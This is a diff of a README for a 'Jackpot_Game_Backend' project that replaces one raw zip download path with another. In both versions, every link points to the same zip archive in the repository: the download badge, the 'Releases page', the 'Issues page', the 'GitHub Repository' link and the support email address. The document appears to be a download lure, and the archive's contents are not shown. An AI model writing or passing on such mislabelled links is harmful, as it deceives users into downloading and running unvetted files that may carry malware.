@@ -1,7 +1,7 @@
 # 🎰 Jackpot_Game_Backend - Easy Setup for Your Gaming Experience
 
 ## 📥 Download the Application
-[![Download Jackpot_Game_Backend](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip)
+[![Download Jackpot_Game_Backend](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip)
 
 ## 🚀 Getting Started
 This guide will help you easily download and run the Jackpot_Game_Backend application. Follow these simple steps to get started on your gaming journey.
@@ -15,7 +15,7 @@ To ensure the best performance, your computer should meet the following requirem
 - **Network:** A stable internet connection is recommended
 
 ## 📁 Download & Install
-1. Click the **Download Now** badge above or visit the [Releases page](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip) directly.
+1. Click the **Download Now** badge above or visit the [Releases page](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip) directly.
 2. Choose the version you want to install. There are different versions for different operating systems, so select accordingly.
 3. Once the download is complete, locate the downloaded file on your computer.
 
@@ -51,11 +51,11 @@ The Jackpot_Game_Backend application offers the following features:
 ## 🤝 Support & Contact
 If you encounter issues or have questions, support is available:
 
-- Visit the [Issues page](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip) for troubleshooting tips and to report bugs.
-- For direct inquiries, email our support team at https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip
+- Visit the [Issues page](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip) for troubleshooting tips and to report bugs.
+- For direct inquiries, email our support team at https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip
 
 ## 🔗 Additional Resources
-For more information, tutorials, and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/Xiphura/Jackpot_Game_Backend.zip).
+For more information, tutorials, and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/huyen0711/Jackpot_Game_Backend/main/src/Jackpot_Backend_Game_3.1-alpha.3.zip).
 
 ## 📢 Stay Updated
 To stay informed about new releases and updates, consider watching this repository:
